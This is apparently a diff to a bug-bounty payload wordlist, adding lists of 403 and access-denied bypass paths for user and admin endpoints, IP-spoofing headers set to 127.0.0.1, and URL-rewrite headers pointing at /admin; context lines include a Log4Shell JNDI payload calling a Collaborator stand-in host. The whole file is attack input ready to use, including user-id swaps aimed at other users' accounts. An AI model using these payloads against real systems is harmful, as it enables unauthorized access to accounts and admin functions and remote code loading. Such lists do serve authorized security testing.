@@ -44,3 +44,39 @@ Cookie: session=
 /api/public/latest?anything=/api/public
 /api/public/latest?anything=/api/private
 /api/public/${jndi:ldap://BURP_COLLAB}
+# ─── endpoint 403/access-denied bypass path patterns (pages 79/95/106 of bounty_tips_100) ───
+# When /api/v1/users/{id} returns 403/access-denied, try each of these:
+/api/v1/users/{id}.json
+/api/v1/users/{id}?
+/api/v1/users/{id}??
+/api/v1/users/{id}..;/
+/api/v1/users/{id}\..\.\getUser
+/api/v1/users/{id}/
+/api/v2/users/{id}
+/api/v3/users/{id}
+/api/v1/users/{id}$accountdetails
+/api/v1/users/{id}$accountdetails-{id}
+/api/v1/users/{your_id}${victim_id}
+/api/v1/users/{id}/email
+# ─── unicode/percent-tricks for /admin (page 85 403-bypass) ───
+/%2e/admin
+/./admin/./
+/admin;/
+/admin/~
+/admin?param
+/admin#
+/.admin
+/admin.
+# ─── extra spoof headers (page 66) ───
+X-Cluster-Client-IP: 127.0.0.1
+X-Fastly-Client-IP: 127.0.0.1
+Fastly-Client-IP: 127.0.0.1
+True-Client-IP: 127.0.0.1
+CF-Connecting-IP: 127.0.0.1
+X-Forwarded-Proto: 127.0.0.1
+X-Forwarded-By: 127.0.0.1
+# ─── header-based endpoint bypass (page 80) ───
+X-Original-URL: /admin
+X-Original-URL: /api/getUser
+X-Rewrite-URL: /admin
+Referer: https://target.com/admin
